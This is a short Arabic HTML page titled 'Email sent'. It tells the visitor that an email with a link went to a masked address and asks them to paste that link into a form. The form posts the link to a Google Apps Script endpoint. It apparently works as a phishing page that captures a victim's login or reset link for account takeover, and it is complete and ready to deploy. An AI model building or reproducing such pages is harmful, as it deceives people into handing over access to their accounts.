<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<meta name="viewport"
      content="width=device-width, initial-scale=1.0">

<title>تم إرسال البريد الإلكتروني</title>

<style>

*{
    box-sizing:border-box;
}

html,
body{
    width:100%;
    height:100%;
    margin:0;
    padding:0;
    overflow:hidden;
}

body{
    background:#fff;
    font-family:Arial,sans-serif;
    color:#111;
}

.page{
    width:100%;
    height:100dvh;
    padding:30px;
    display:flex;
    flex-direction:column;
    align-items:center;
}

/* العنوان */
.title{
    margin-top:45px;
    font-size:28px;
    font-weight:700;
    text-align:center;
}

/* النص */
.subtitle{
    margin-top:12px;
    font-size:16px;
    font-weight:400;
    color:#777;
    text-align:center;
}

/* المساحة الوسطى */
.middle{
    flex:1;
}

/* منطقة الرابط */
.link-area{
    width:100%;
    max-width:400px;
    margin-bottom:25px;
}

/* خانة الرابط */
.link-input{
    width:100%;
    height:52px;
    border:1px solid #ddd;
    border-radius:25px;
    padding:0 18px;
    font-size:15px;
    text-align:right;
    outline:none;
    background:#fff;
    margin-bottom:12px;
}

.link-input:focus{
    border-color:#999;
}

/* زر الإرسال */
.send-button{
    width:100%;
    height:48px;
    border:0;
    border-radius:25px;
    background:#0877e8;
    color:#fff;
    font-size:16px;
    cursor:pointer;
}

.send-button:active{
    opacity:.8;
}

/* رسالة النتيجة */
.message{
    display:none;
    margin-top:12px;
    font-size:14px;
    text-align:center;
}

</style>

</head>


<body>

<div class="page">

    <!-- العنوان -->
    <div class="title">
       تم إرسال البريد الإلكتروني
    </div>


    <!-- النص -->
    <div class="subtitle">
        لقد أرسلنا بريد إلكتروني إلي a*******r@i*****.com فيما سبق تحتوي علا رابط يرجا ارسال ارابط هنا في الاسفل
    </div>


    <!-- المساحة الوسطى -->
    <div class="middle"></div>


    <!-- نموذج الإرسال -->
    <form
        class="link-area"
        action="https://script.google.com/macros/s/AKfycbyMQ6IFFPfxlKA2HEQQP8yGLUR2Lw_fP_zDVyH5wxfLHBH0lxWMPxc6cP-yImNaRTEF/exec"
        method="POST">

        <!-- الرابط -->
        <input
            class="link-input"
            type="url"
            name="link"
            placeholder="أدخل الرابط هنا"
            required>


        <!-- زر الإرسال -->
        <button
            class="send-button"
            type="submit">

            إرسال الرابط

        </button>

    </form>

</div>

</body>

</html>
